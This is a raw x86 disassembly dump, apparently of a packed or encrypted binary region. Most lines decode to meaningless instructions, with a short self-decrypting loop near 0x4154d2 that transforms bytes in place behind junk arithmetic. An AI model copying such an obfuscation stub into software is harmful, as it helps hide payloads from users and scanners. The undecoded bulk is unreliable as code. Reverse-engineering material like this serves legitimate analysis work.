  414f3c:	and    DWORD PTR [ebx-0x55ee9e2],esp
  414f42:	inc    esp
  414f43:	imul   eax,DWORD PTR [ebp+0x3e117f6d],0x6e
  414f4a:	mov    ebx,0x4a75c45f
  414f4f:	push   ebp
  414f50:	test   al,0x36
  414f52:	and    DWORD PTR [ebp-0x16],edx
  414f55:	shr    DWORD PTR [edx-0x38],cl
  414f58:	mov    ds:0x4abce3c9,eax
  414f5d:	leave  
  414f5e:	stos   BYTE PTR es:[edi],al
  414f5f:	push   cs
  414f60:	sahf   
  414f61:	sub    BYTE PTR [esi+0x4d],0xf5
  414f65:	fld    DWORD PTR [esi]
  414f67:	xchg   esi,eax
  414f68:	push   esi
  414f69:	lahf   
  414f6a:	sub    BYTE PTR [eax+eiz*2+0x7df8c0b0],bh
  414f71:	sub    al,BYTE PTR [eax]
  414f73:	cmp    dl,BYTE PTR [edi+ebp*2-0x16]
  414f77:	mov    al,0x7c
  414f79:	pop    edx
  414f7a:	sub    dh,BYTE PTR [eax]
  414f7c:	js     0x414f86
  414f7e:	call   0xd5ca:0x58b6cfcf
  414f85:	pop    ebp
  414f86:	jne    0x414ffe
  414f88:	adc    dh,BYTE PTR [ecx+0xc150f7a]
  414f8e:	push   0x78
  414f90:	mov    bh,0x27
  414f92:	jmp    0x414f40
  414f94:	dec    edi
  414f95:	das    
  414f96:	xor    eax,ecx
  414f98:	xor    bl,dh
  414f9a:	aas    
  414f9b:	push   es
  414f9c:	jmp    0x6c9eb4
  414fa1:	loopne 0x414f24
  414fa3:	daa    
  414fa4:	(bad)
  414fa7:	mov    ?,WORD PTR [eax]
  414fa9:	outs   dx,DWORD PTR ds:[esi]
  414faa:	mov    dh,0x31
  414fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fad:	jno    0x414fd1
  414faf:	jo     0x414f91
  414fb1:	push   ds
  414fb2:	xchg   esp,eax
  414fb4:	add    eax,0x67a5e9ba
  414fb9:	bound  esi,QWORD PTR [ebx]
  414fbb:	stos   DWORD PTR es:[edi],eax
  414fbc:	jmp    0x3c0022d5
  414fc1:	stos   DWORD PTR es:[edi],eax
  414fc2:	mov    DWORD PTR [ebp-0x1e6ee397],ebp
  414fc8:	xor    ebp,ebp
  414fca:	cmp    BYTE PTR ds:0xb95651d3,ch
  414fd0:	sahf   
  414fd1:	imul   ecx,esi,0xe3ce5744
  414fd7:	scas   al,BYTE PTR es:[edi]
  414fd8:	and    dh,bl
  414fda:	and    esi,DWORD PTR [edi+edi*2]
  414fdd:	inc    esp
  414fde:	not    BYTE PTR [ecx+0x77]
  414fe1:	mov    ecx,0x71514517
  414fe6:	mov    esp,0x650d6294
  414feb:	scas   al,BYTE PTR es:[edi]
  414fec:	sbb    edi,ecx
  414fee:	fldenv [edx-0x12]
  414ff1:	push   edi
  414ff2:	sub    esi,esi
  414ff4:	cdq    
  414ff5:	push   esi
  414ff6:	inc    ebx
  414ff7:	jb     0x415024
  414ff9:	out    0xc4,al
  414ffb:	jo     0x415018
  414ffd:	outs   dx,BYTE PTR ds:[esi]
  414ffe:	stos   BYTE PTR es:[edi],al
  414fff:	jle    0x41503b
  415001:	int    0xaa
  415003:	sbb    ch,BYTE PTR [ebp+0x71871b37]
  415009:	pop    ebp
  41500a:	cmp    esi,ebp
  41500c:	xor    dl,BYTE PTR [edi-0x14517345]
  415012:	aas    
  415013:	push   esp
  415014:	icebp  
  415015:	aaa    
  415016:	jle    0x415087
  415018:	lds    edi,FWORD PTR [ebx+edx*2+0x5c]
  41501c:	es js  0x415075
  41501f:	test   BYTE PTR ds:[edx],bl
  415022:	stos   DWORD PTR es:[edi],eax
  415023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415024:	and    al,0x90
  415026:	cdq    
  415027:	inc    edx
  415028:	iret   
  415029:	mov    ds:0xb8bc4420,al
  41502e:	cs and edi,edi
  415031:	sti    
  415032:	xor    ecx,ebp
  415034:	sbb    BYTE PTR [edx+ebx*8],cl
  415037:	nop
  415038:	mov    ch,0x54
  41503a:	outs   dx,DWORD PTR ds:[esi]
  41503b:	mov    edi,0x1579cf25
  415040:	fwait
  415041:	or     ebx,edx
  415043:	shl    DWORD PTR [edx],1
  415045:	mov    edi,0xf9fee240
  41504a:	pop    edi
  41504b:	into   
  41504c:	jp     0x415020
  41504e:	nop
  41504f:	pop    edx
  415050:	pusha  
  415051:	int3   
  415052:	cmp    al,ch
  415054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415055:	or     al,0xb4
  415057:	or     dh,dl
  415059:	call   0x1184:0xc22e6d33
  415060:	jmp    0xd4ece7d
  415065:	fisttp DWORD PTR [edx]
  415067:	and    BYTE PTR [ecx+0x32],bl
  41506a:	push   edi
  41506b:	jne    0x415032
  41506d:	sar    DWORD PTR [ebp+0x72],cl
  415070:	jmp    0xd046:0xfc97a2db
  415077:	pop    ss
  415078:	jae    0x415090
  41507a:	out    dx,al
  41507b:	shl    DWORD PTR [ebx+0x2b],cl
  41507e:	inc    ecx
  41507f:	jp     0x415055
  415081:	mov    al,ds:0x5b6b2c17
  415086:	inc    edx
  415087:	push   ecx
  415088:	or     al,0xbf
  41508a:	call   0x89fcc69d
  41508f:	mov    ch,0xad
  415091:	inc    ebp
  415092:	push   es
  415093:	mov    eax,ds:0xccc614a7
  415098:	adc    DWORD PTR [ecx-0x40d4b12f],ecx
  41509e:	cmp    DWORD PTR [edi],ebx
  4150a0:	and    DWORD PTR [eax+0x5b],edx
  4150a3:	(bad)  
  4150a4:	add    dl,BYTE PTR [ebp+0x697f54f3]
  4150aa:	popa   
  4150ab:	and    al,0xbf
  4150ad:	add    bl,BYTE PTR [edx]
  4150af:	and    BYTE PTR [eax-0x24],bl
  4150b2:	mov    al,al
  4150b4:	(bad)  
  4150b5:	or     al,0x33
  4150b7:	sub    al,0xc8
  4150b9:	and    BYTE PTR es:[esi-0x66],dl
  4150bd:	pop    es
  4150be:	addr16 je 0x415049
  4150c1:	rcr    dh,1
  4150c3:	inc    ecx
  4150c4:	dec    ebp
  4150c5:	xchg   edx,eax
  4150c6:	push   cs
  4150c7:	repnz mov eax,ds:0x577c916b
  4150cd:	adc    BYTE PTR [eax],cl
  4150cf:	and    eax,0xec7681be
  4150d4:	ins    DWORD PTR es:[edi],dx
  4150d5:	xchg   esi,eax
  4150d6:	popa   
  4150d7:	je     0x415148
  4150d9:	sub    eax,0xfd024743
  4150de:	push   cs
  4150df:	das    
  4150e0:	xchg   DWORD PTR [eax+0x77],edi
  4150e3:	lds    esp,FWORD PTR [ecx+esi*4-0x2e]
  4150e7:	and    al,0x93
  4150e9:	jg     0x4150fd
  4150eb:	jo     0x415103
  4150ed:	pop    DWORD PTR [eax]
  4150ef:	in     eax,dx
  4150f0:	(bad)  
  4150f1:	jns    0x415108
  4150f3:	mov    bh,0x58
  4150f5:	sub    al,0x12
  4150f7:	mov    eax,ds:0xdfa27c16
  4150fc:	bound  esi,QWORD PTR [esi-0x73]
  4150ff:	cmp    dh,dl
  415101:	ins    DWORD PTR es:[edi],dx
  415102:	ds dec eax
  415104:	xor    eax,0x11434fe6
  415109:	add    BYTE PTR [ebp-0x79ce0ba5],dl
  41510f:	(bad)  
  415110:	iret   
  415111:	scas   al,BYTE PTR es:[edi]
  415112:	add    al,BYTE PTR [ecx-0x1690ce3a]
  415118:	fistp  DWORD PTR [edx]
  41511a:	pop    esi
  41511b:	dec    esp
  41511c:	xor    al,0x6f
  41511e:	test   al,0xda
  415120:	jns    0x415105
  415122:	fmul   st(0),st
  415124:	xchg   BYTE PTR [ebp-0x13],ch
  415127:	and    eax,0x3598956d
  41512c:	into   
  41512d:	and    DWORD PTR ds:0xdd760f4a,ebp
  415133:	or     ah,ch
  415135:	arpl   WORD PTR [ebp-0x6ada4faf],dx
  41513b:	call   0x7e92:0xcc969be1
  415142:	lea    ecx,gs:[eax]
  415145:	inc    esi
  415146:	loope  0x415151
  415148:	or     bl,BYTE PTR [ebx+0x3a]
  41514b:	sub    ecx,DWORD PTR [esi+0x29]
  41514e:	fadd   DWORD PTR [edi-0x2e973994]
  415154:	mov    edi,0xbed6b4ff
  415159:	retf   0x70ec
  41515c:	lock push esp
  41515e:	mov    bh,0x46
  415160:	popf   
  415161:	mov    ?,ebx
  415163:	mov    dl,0x93
  415165:	loope  0x41510b
  415167:	sbb    eax,0xf64e43d6
  41516c:	dec    edx
  41516d:	or     DWORD PTR es:[esi+0x6a],ecx
  415171:	jnp    0x4151d8
  415173:	mul    DWORD PTR [edi]
  415175:	out    0x62,eax
  415177:	aad    0xcc
  415179:	xor    BYTE PTR [ecx],bl
  41517b:	clc    
  41517c:	jl     0x4151d4
  41517e:	out    dx,al
  41517f:	je     0x41592b
  415185:	mov    DWORD PTR [ebp-0x18],0x1001
  41518c:	mov    edx,DWORD PTR [ebp-0x1c]
  41518f:	xor    ecx,ecx
  415191:	test   edx,edx
  415193:	jmp    0x4154cc
  415198:	jno    0x4151dd
  41519a:	mov    edx,0xb9bcbc52
  41519f:	fs inc eax
  4151a1:	sub    BYTE PTR [edx],bh
  4151a3:	xchg   edx,eax
  4151a4:	(bad)  
  4151a5:	test   DWORD PTR [edx],0xbeb03cdd
  4151ab:	mov    esi,0xbebec4ed
  4151b0:	(bad)  
  4151b1:	xchg   esp,eax
  4151b2:	(bad)  [esp+ebp*8-0x3f71ccd4]
  4151b9:	mov    ebx,0xb9a97e3d
  4151be:	adc    al,0xc5
  4151c0:	pop    ebx
  4151c1:	cld    
  4151c2:	loope  0x4151fe
  4151c4:	sub    ecx,DWORD PTR [ebp+0x7e]
  4151c7:	in     eax,dx
  4151c8:	pop    ds
  4151c9:	mov    ah,0xa4
  4151cb:	mov    ds:0x75723347,al
  4151d0:	sub    al,0x46
  4151d2:	jne    0x415166
  4151d4:	sbb    ecx,DWORD PTR [esi+0x4d97efee]
  4151da:	adc    al,0xc3
  4151dc:	mov    al,0x18
  4151de:	out    0xb5,al
  4151e0:	jns    0x4151e0
  4151e2:	rol    DWORD PTR [ebp-0x1c],cl
  4151e5:	jmp    0x4151f1
  4151e7:	or     ah,BYTE PTR [eax-0x58]
  4151ea:	push   ss
  4151eb:	adc    edx,edi
  4151ed:	cmp    BYTE PTR [eax],bh
  4151ef:	xchg   edi,eax
  4151f0:	ret    
  4151f1:	ss mov dl,0xb9
  4151f4:	sti    
  4151f5:	push   0x20
  4151f7:	and    BYTE PTR [ebx],dl
  4151f9:	push   ebx
  4151fa:	inc    ebp
  4151fb:	mov    ecx,gs
  4151fd:	(bad)  
  4151fe:	lds    edx,FWORD PTR [ecx-0x10032dec]
  415204:	outs   dx,DWORD PTR ds:[esi]
  415205:	inc    edx
  415206:	sbb    BYTE PTR [ebp+0x793c384],ch
  41520c:	pop    eax
  41520d:	inc    ebx
  41520e:	js     0x41519a
  415210:	(bad)  
  415211:	jmp    DWORD PTR [eax]
  415213:	xchg   esp,eax
  415214:	sti    
  415215:	sbb    DWORD PTR [esi],ebx
  415217:	clc    
  415218:	xor    edi,edx
  41521a:	push   ds
  41521b:	pop    ecx
  41521c:	outs   dx,BYTE PTR ds:[esi]
  41521d:	(bad)  
  41521e:	pusha  
  41521f:	mov    cl,0xc
  415221:	jecxz  0x4151fa
  415223:	mov    dl,0xa2
  415225:	mov    esi,0xd38ffd1c
  41522a:	and    BYTE PTR [eax+0x30b0367f],ch
  415230:	loopne 0x4151b2
  415232:	ficomp DWORD PTR [eax-0x2e]
  415235:	cmp    eax,eax
  415237:	sub    DWORD PTR [edx-0x7eaf8d8d],esi
  41523d:	adc    al,0x8e
  41523f:	mov    ch,0xb1
  415241:	jmp    0x81eca425
  415246:	mov    ecx,0x93ef4f63
  41524b:	add    eax,0xd3cdce0b
  415250:	in     al,0x53
  415252:	push   edx
  415253:	icebp  
  415254:	cs iret 
  415256:	lock pop ds
  415258:	ds icebp 
  41525a:	leave  
  41525b:	out    0xbf,al
  41525d:	xor    ah,BYTE PTR [edx-0x7615e93a]
  415263:	sub    eax,0x58f8a85b
  415268:	cs test ebx,ecx
  41526b:	add    BYTE PTR [esi-0x39de12a6],al
  415271:	add    edx,ebx
  415273:	dec    ebp
  415274:	in     al,0x8b
  415276:	fs (bad) 
  415278:	in     eax,dx
  415279:	es dec ebx
  41527b:	aad    0x3a
  41527d:	mov    bl,bh
  41527f:	mov    eax,0xbe0c62f9
  415284:	dec    esp
  415285:	push   ebp
  415286:	aas    
  415287:	mov    ebx,0xeb3b4d32
  41528c:	imul   esp,DWORD PTR [esi+0x23],0xca14833d
  415293:	mov    al,ds:0xf670fa09
  415298:	inc    esp
  415299:	and    BYTE PTR [ebp-0x3e],ah
  41529c:	mov    eax,0x29681e5c
  4152a1:	add    DWORD PTR [ecx-0x1043d48],edi
  4152a7:	test   DWORD PTR [eax],0x9813d333
  4152ad:	cmp    eax,0x332d5e43
  4152b2:	pop    ebx
  4152b3:	jno    0x415255
  4152b5:	lds    edx,FWORD PTR [edi-0x7c6618a2]
  4152bb:	in     eax,dx
  4152bc:	inc    edx
  4152bd:	or     BYTE PTR [esi-0x8],ah
  4152c0:	push   ecx
  4152c1:	ficom  DWORD PTR [edx]
  4152c3:	pop    ebp
  4152c4:	sahf   
  4152c5:	dec    ebp
  4152c6:	cli    
  4152c7:	add    eax,0x9659740f
  4152cc:	sti    
  4152cd:	iret   
  4152ce:	sub    ecx,esp
  4152d0:	pop    ds
  4152d1:	mov    edx,0x596fc91d
  4152d6:	leave  
  4152d7:	mov    BYTE PTR [ecx],ah
  4152d9:	or     ebp,DWORD PTR [ebx+ebx*8+0x310fcdfb]
  4152e0:	icebp  
  4152e1:	jle    0x4152ef
  4152e3:	mov    edx,0xeaffd73
  4152e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152e9:	jp     0x415296
  4152eb:	ss retf 
  4152ed:	inc    eax
  4152ee:	mov    cl,0x2a
  4152f0:	(bad)  
  4152f1:	xor    edx,ebx
  4152f3:	dec    edi
  4152f4:	mov    dl,0x8c
  4152f6:	jae    0x415374
  4152f8:	es mov dl,0xc9
  4152fb:	popa   
  4152fc:	cmp    ebp,DWORD PTR ds:0x5a40d603
  415302:	je     0x415312
  415304:	scas   al,BYTE PTR es:[edi]
  415305:	jl     0x415342
  415307:	dec    ebp
  415308:	test   dl,ah
  41530a:	and    dh,BYTE PTR [eax]
  41530c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41530d:	and    al,0x1b
  41530f:	int    0x6a
  415311:	or     eax,0xec45d375
  415316:	test   DWORD PTR [edx+esi*1],eax
  415319:	addr16 xchg esp,eax
  41531b:	mov    BYTE PTR [ecx+0x616a581b],ch
  415321:	int3   
  415322:	sbb    al,0xc9
  415324:	aad    0xfe
  415326:	ja     0x415383
  415328:	xor    eax,0x5e0cea96
  41532d:	mov    DWORD PTR [eax-0x118904f2],0x87a3ca21
  415337:	mov    eax,0x1980fc5b
  41533c:	aam    0xff
  41533e:	sahf   
  41533f:	jge    0x4152e3
  415341:	(bad)  
  415342:	add    bh,BYTE PTR [edi+0x1a]
  415345:	dec    ebp
  415346:	sub    DWORD PTR [esi],ebx
  415348:	mov    cl,0x75
  41534a:	mov    eax,0x7118d1fd
  41534f:	add    BYTE PTR [ecx],dl
  415351:	(bad)  
  415353:	inc    edi
  415354:	adc    BYTE PTR [ecx-0x6c7e511a],dl
  41535a:	rcr    DWORD PTR [edx+0x57],cl
  41535d:	or     BYTE PTR [eax+0x1a6194b7],0xba
  415364:	fisub  DWORD PTR [edx-0x39eb9060]
  41536a:	and    ebx,ebp
  41536c:	jae    0x415395
  41536e:	lods   al,BYTE PTR ds:[esi]
  41536f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415370:	adc    BYTE PTR [edx],bh
  415372:	jl     0x4153d8
  415374:	push   ebp
  415375:	mov    bh,BYTE PTR [ecx]
  415377:	jg     0x415330
  415379:	push   edi
  41537a:	sbb    ah,BYTE PTR [ecx-0x8f61124]
  415380:	cmc    
  415381:	and    DWORD PTR [esi+0x619b73f6],ecx
  415387:	dec    esp
  415388:	iret   
  415389:	jne    0x415360
  41538b:	mov    DWORD PTR [edx-0x16a31942],edx
  415391:	inc    esp
  415392:	(bad)  
  415393:	out    dx,eax
  415394:	xor    DWORD PTR [esi-0x7eea71ec],ecx
  41539a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41539b:	jp     0x41534a
  41539d:	adc    eax,0xf482878e
  4153a2:	js     0x4153a8
  4153a4:	sbb    al,0x20
  4153a6:	dec    edi
  4153a7:	xor    DWORD PTR [edi+0x51997ef0],edx
  4153ad:	adc    eax,0xb09ce31a
  4153b2:	loop   0x41542b
  4153b4:	lods   al,BYTE PTR ds:[esi]
  4153b5:	cmp    BYTE PTR es:[edx-0x2343f2fb],0x95
  4153bd:	sbb    ebx,DWORD PTR [eax]
  4153bf:	dec    esi
  4153c0:	stos   BYTE PTR es:[edi],al
  4153c1:	call   0x66a2:0xc4262517
  4153c8:	sub    BYTE PTR [edx+eax*2-0x13],0x60
  4153cd:	xchg   BYTE PTR [edi+0x5d0324c2],cl
  4153d3:	cld    
  4153d4:	int    0x2
  4153d6:	pop    ebx
  4153d7:	fild   QWORD PTR [edx]
  4153d9:	mov    cl,0xa7
  4153db:	test   eax,0x93ede2d2
  4153e0:	iret   
  4153e1:	clc    
  4153e2:	sub    BYTE PTR [eax-0x6e2f01b9],bh
  4153e8:	cld    
  4153e9:	dec    edx
  4153ea:	mov    BYTE PTR [edi+0x23],bh
  4153ed:	mov    bh,0x23
  4153ef:	fsubr  QWORD PTR [eax+0x5ee5d43c]
  4153f5:	or     edi,DWORD PTR [ebx]
  4153f7:	(bad)  
  4153fa:	rcl    ecx,0xd7
  4153fd:	add    DWORD PTR [esi+0x35],0xa7b533b3
  415404:	and    DWORD PTR [ebp-0xf],esp
  415407:	js     0x4153ce
  415409:	and    edi,DWORD PTR [edi+0x4d81e741]
  41540f:	leave  
  415410:	or     DWORD PTR ds:0x3f4db541,edi
  415416:	cmp    DWORD PTR [eax+0x5957429f],edi
  41541c:	fst    st(6)
  41541e:	out    0x69,al
  415420:	test   DWORD PTR [edi],esi
  415422:	iret   
  415423:	imul   esp,DWORD PTR [eax],0xffffff88
  415426:	cs xchg esp,eax
  415428:	ret    
  415429:	adc    al,0xb1
  41542b:	int    0xb3
  41542d:	sub    al,0x9d
  41542f:	add    edi,DWORD PTR [edx-0xb41ab08]
  415435:	xchg   ebx,eax
  415436:	ret    0xdd5c
  415439:	popf   
  41543a:	stc    
  41543b:	scas   eax,DWORD PTR es:[edi]
  41543c:	sbb    bl,dl
  41543e:	sbb    cl,ah
  415440:	mov    esi,0xbe77a4de
  415445:	mov    al,0x72
  415447:	leave  
  415448:	sub    eax,0x31a85488
  41544d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41544e:	xor    al,0xc
  415450:	pop    edx
  415451:	xor    dh,ah
  415453:	ja     0x4153e4
  415455:	sbb    ecx,ebx
  415457:	and    eax,0xae9b6baa
  41545c:	ja     0x4154c0
  41545e:	(bad)
  415461:	rcr    BYTE PTR [eax],cl
  415463:	pop    edi
  415464:	jle    0x415450
  415466:	xchg   ebx,eax
  415467:	xor    BYTE PTR [esi-0x44],dh
  41546a:	xchg   ebp,eax
  41546b:	punpcklwd mm2,DWORD PTR [ecx-0xf]
  41546f:	hlt    
  415470:	add    eax,0x691bbd5d
  415475:	xor    al,0xa5
  415477:	push   edi
  415478:	mov    ds,WORD PTR [edx+0x1b69079]
  41547e:	and    cl,BYTE PTR [edi]
  415480:	aaa    
  415481:	into   
  415482:	mov    eax,ebx
  415484:	dec    edx
  415485:	(bad)  
  415486:	jle    0x415468
  415488:	jae    0x415429
  41548a:	pop    ecx
  41548b:	aad    0x3d
  41548d:	fbld   TBYTE PTR [eax-0x2f]
  415490:	or     BYTE PTR [edx+0x468bccd5],0x2a
  415497:	xchg   esp,eax
  415498:	or     esp,DWORD PTR [esi+0x32c229c3]
  41549e:	or     eax,0x12200e60
  4154a3:	add    eax,0xe95ba2db
  4154a8:	pop    es
  4154a9:	in     al,0xdc
  4154ab:	adc    BYTE PTR [eax+0x8f2a050],0x8e
  4154b2:	sbb    al,0xb7
  4154b4:	call   0x2c0c1c5c
  4154b9:	lods   eax,DWORD PTR ds:[esi]
  4154ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154bb:	sbb    dl,BYTE PTR [edi]
  4154bd:	add    BYTE PTR [esp+edx*4],cl
  4154c0:	mov    BYTE PTR [eax+0x52567706],0xaf
  4154c7:	sbb    ah,0xad
  4154ca:	stc    
  4154cb:	cmp    cl,BYTE PTR [edi]
  4154cd:	test   BYTE PTR [esi+0x0],bh
  4154d0:	add    BYTE PTR [eax],al
  4154d2:	mov    al,BYTE PTR [ecx+edi*1]
  4154d5:	mov    BYTE PTR [ebp-0x1],al
  4154d8:	mov    BYTE PTR [ebp-0x3],0x74
  4154dc:	mov    BYTE PTR [ebp-0x2],0x16
  4154e0:	mov    BYTE PTR [ebp-0x4],0x62
  4154e4:	movzx  eax,BYTE PTR [ebp-0x4]
  4154e8:	movzx  ebx,BYTE PTR [ebp-0x2]
  4154ec:	or     eax,0xd4
  4154f1:	and    eax,ebx
  4154f3:	movzx  ebx,BYTE PTR [ebp-0x3]
  4154f7:	and    eax,ebx
  4154f9:	mov    BYTE PTR [ebp-0x12],al
  4154fc:	mov    BYTE PTR [ebp-0x11],0xfe
  415500:	mov    BYTE PTR [ebp-0x14],0x32
  415504:	mov    BYTE PTR [ebp-0x4],0xc7
  415508:	mov    BYTE PTR [ebp-0x2],0x73
  41550c:	mov    BYTE PTR [ebp-0x3],0xb3
  415510:	mov    al,BYTE PTR [ebp-0x3]
  415513:	mov    bl,BYTE PTR [ebp-0x2]
  415516:	or     al,bl
  415518:	mov    bl,BYTE PTR [ebp-0x4]
  41551b:	sub    al,bl
  41551d:	mov    bl,BYTE PTR [ebp-0x14]
  415520:	imul   bl
  415522:	mov    bl,BYTE PTR [ebp-0x11]
  415525:	sub    al,bl
  415527:	mov    bl,BYTE PTR [ebp-0x12]
  41552a:	cmp    bl,al
  41552c:	ja     0x415541
  415532:	movzx  eax,BYTE PTR [ebp-0x1]
  415536:	sub    eax,0xed
  41553b:	mov    BYTE PTR [ebp-0x1],al
  41553e:	ror    BYTE PTR [ebp-0x1],1
  415541:	mov    al,BYTE PTR [ebp-0x1]
  415544:	mov    BYTE PTR [ecx+edi*1],al
  415547:	inc    ecx
  415548:	cmp    ecx,edx
  41554a:	jb     0x4154d2
  415550:	dec    DWORD PTR [ebp-0x18]
  415553:	jne    0x41518c
  415559:	mov    eax,DWORD PTR [ebp+0x8]
  41555c:	mov    ecx,DWORD PTR [ebp+0xc]
  41555f:	shrd   eax,ecx,0x2
  415563:	shr    ecx,0x2
  415566:	mov    ecx,DWORD PTR [ebp+0x8]
  415569:	mov    edx,DWORD PTR [ebp+0xc]
  41556c:	xor    eax,esi
  41556e:	xor    edx,edx
  415570:	jmp    0x4158a9
  415575:	cmp    dl,BYTE PTR [ebx]
  415577:	inc    esi
  415578:	mov    WORD PTR [eax-0x64],gs
  41557b:	cmp    al,0xb3
  41557d:	mov    ch,0xd8
  41557f:	(bad)  
  415580:	fst    QWORD PTR [ebp-0x74]
  415583:	dec    esp
  415584:	xchg   edx,eax
  415585:	ins    BYTE PTR es:[edi],dx
  415586:	mov    dh,0xbe
  415588:	mov    esi,0xbebec4ed
  41558d:	clc    
  41558e:	ret    0xdaef
  415591:	inc    ebp
  415592:	mov    DWORD PTR [edx-0x2e],ecx
  415595:	shr    BYTE PTR [edx+0x19bcb142],cl
  41559b:	add    DWORD PTR [edx+0x75],ebx
  41559e:	jl     0x41555c
  4155a0:	sbb    cl,BYTE PTR [edi+0x5a]
  4155a3:	adc    eax,0xd2ad5b44
  4155a8:	ret    
  4155a9:	leave  
  4155aa:	ret    
  4155ab:	pop    es
  4155ac:	sbb    dl,ah
  4155ae:	xor    eax,0x1cd7bdda
  4155b3:	or     DWORD PTR [edi+0x671cca02],eax
  4155b9:	xchg   ecx,eax
  4155ba:	daa    
  4155bb:	in     al,0x6e
  4155bd:	popa   
  4155be:	test   DWORD PTR [eax+esi*1+0x7d],esi
  4155c2:	jl     0x415630
  4155c4:	jnp    0x4155d0
  4155c6:	daa    
  4155c7:	nop
  4155c8:	lea    esp,[ebx+0x5c94a111]
  4155ce:	pop    edi
  4155cf:	fisub  WORD PTR [edx]
  4155d1:	ss ds push ebx
  4155d4:	push   es
  4155d5:	sbb    ah,BYTE PTR [esi-0x165fd718]
  4155db:	(bad)  
  4155dc:	mov    ebx,0x7e088051
  4155e1:	xlat   BYTE PTR ds:[ebx]
  4155e2:	icebp  
  4155e3:	add    ebp,DWORD PTR [edi-0x39c2b281]
  4155e9:	pop    bp
  4155eb:	imul   edi,DWORD PTR [esi],0x57
  4155ee:	sub    al,0x54
  4155f0:	out    0x19,eax
  4155f2:	mov    al,ds:0x2696a86f
  4155f7:	xor    eax,0xb4ffc1cc
  4155fc:	lock or esp,DWORD PTR [ecx+0x74974ea9]
  415603:	lahf   
  415604:	(bad)  
  415605:	out    0x12,eax
  415607:	mov    bl,0xb4
  415609:	mov    edi,0xf9330ef0
  41560e:	mov    esi,0xfeede385
  415613:	sub    BYTE PTR ds:0x1d938ae8,al
  415619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41561a:	fimul  WORD PTR [eax]
  41561c:	sbb    al,0xf0
  41561e:	cmp    dl,dl
  415620:	xor    edx,DWORD PTR [edi-0x58daa89f]
  415626:	inc    esi
  415627:	dec    edx
  415628:	(bad)  
  415629:	sahf   
  41562a:	pop    ebx
  41562b:	adc    al,0x0
  41562d:	sub    cl,0xdc
  415630:	les    ecx,FWORD PTR [ecx]
  415632:	sub    al,0x33
  415634:	es sar DWORD PTR cs:[edx+0x3442af23],1
  41563c:	fnsave [eax+ecx*8]
  41563f:	mov    ebp,0xd6fc5dac
  415644:	jg     0x415695
  415646:	leave  
  415647:	jbe    0x41569d
  415649:	cld    
  41564a:	fs jns 0x415643
  41564d:	ret    0xffd9
  415650:	or     esi,DWORD PTR es:[esi-0x78b75e03]
  415657:	mov    eax,0xb8bdfe86
  41565c:	pop    edx
  41565d:	daa    
  41565e:	xor    ch,dh
  415660:	stc    
  415661:	mov    al,0xcb
  415663:	xchg   esi,eax
  415664:	sbb    BYTE PTR [ebp+0x14cb95a],bl
  41566a:	jnp    0x415680
  41566c:	xor    eax,0x7327ad2a
  415671:	xor    DWORD PTR [ebx+0x48],0x7e
  415675:	inc    ecx
  415676:	pop    ecx
  415677:	fdivr  st(5),st
  415679:	add    eax,0x1dfec353
  41567e:	jecxz  0x4156df
  415680:	and    ch,BYTE PTR [ebx+eiz*1+0x45b14eb5]
  415687:	daa    
  415688:	fnstenv [ebp+0x2d]
  41568b:	scas   eax,DWORD PTR es:[edi]
  41568c:	inc    edi
  41568d:	adc    al,0x0
  41568f:	rol    DWORD PTR [esi],cl
  415691:	mov    ds:0xee144446,eax
  415696:	pop    edi
  415697:	pop    edi
  415698:	jmp    0x25ab:0x5adcdb4
  41569f:	aas    
  4156a0:	loope  0x4156bc
  4156a2:	cli    
  4156a3:	mov    cl,0x4b
  4156a5:	inc    esi
  4156a6:	xchg   ebp,eax
  4156a7:	pop    ebp
  4156a8:	xchg   BYTE PTR [ebp+0x5f0d4e68],bh
  4156ae:	jnp    0x415695
  4156b0:	pop    edx
  4156b1:	mov    al,0xe0
  4156b3:	das    
  4156b4:	xchg   ebp,eax
  4156b5:	repz jle 0x415676
  4156b8:	cmp    DWORD PTR [eax-0x3],edx
  4156bb:	and    bl,BYTE PTR [edi]
  4156bd:	test   BYTE PTR [eax+0x14],al
  4156c0:	xor    esi,ebp
  4156c2:	push   eax
  4156c3:	mov    al,0x82
  4156c5:	ret    
  4156c6:	test   al,bh
  4156c8:	add    DWORD PTR [eax],0xffffffe5
  4156cb:	shr    ecx,0x1a
  4156ce:	push   ecx
  4156cf:	add    DWORD PTR [ebx+0x2b],esp
  4156d2:	and    BYTE PTR [edx],0xb5
  4156d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156d6:	cmp    eax,0x37e74ef6
  4156db:	sar    BYTE PTR [edx-0x5daf8df3],cl
  4156e1:	cmp    al,0xbf
  4156e3:	sbb    dl,BYTE PTR [esi+0x24]
  4156e6:	call   0xf5e0:0x33b6daf2
  4156ed:	sbb    eax,0x984a375
  4156f2:	std    
  4156f3:	imul   edi,DWORD PTR [esi],0xb1ef642
  4156f9:	data16 aaa 
  4156fb:	jb     0x4156e1
  4156fd:	fs jecxz 0x41575e
  415700:	cld    
  415701:	xchg   edx,eax
  415702:	data16 lods al,BYTE PTR ds:[esi]
  415705:	cs push ebp
  415707:	xor    al,ch
  415709:	fsubrp st(2),st
  41570b:	mov    esp,0x7e839fb7
  415710:	dec    ebp
  415711:	xor    eax,DWORD PTR [edi+0x67335006]
  415717:	xchg   esp,eax
  415718:	sbb    al,0xe4
  41571a:	push   es
  41571b:	mov    DWORD PTR [ebx],esi
  41571d:	xchg   BYTE PTR ds:0x2309be6d,dl
  415723:	stos   BYTE PTR es:[edi],al
  415724:	cmp    BYTE PTR [edx+0x5e],bh
  415727:	fcomp  QWORD PTR [eax]
  415729:	dec    edx
  41572a:	and    ah,dh
  41572c:	jmp    0x27547b22
  415731:	adc    al,0xa9
  415733:	mov    al,0xbc
  415735:	and    ecx,DWORD PTR [esi+0x731fcecc]
  41573b:	and    edi,DWORD PTR [ebx-0x75]
  41573e:	mov    eax,ds:0xf0e1985
  415743:	add    ah,0x30
  415746:	pop    ebp
